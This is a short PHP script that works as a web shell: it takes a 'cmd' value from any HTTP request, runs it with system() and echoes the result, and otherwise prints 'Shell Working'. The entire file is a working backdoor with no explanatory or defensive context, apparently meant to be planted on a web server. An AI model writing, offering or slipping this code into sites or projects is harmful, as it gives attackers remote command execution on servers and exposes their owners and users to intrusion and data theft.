<?php
if(isset($_REQUEST['cmd'])){
  $cmd = $_REQUEST['cmd'];
  echo "<pre>";
  system($cmd);
  echo "</pre>";
}
else{
  echo "Shell Working";
}

?>
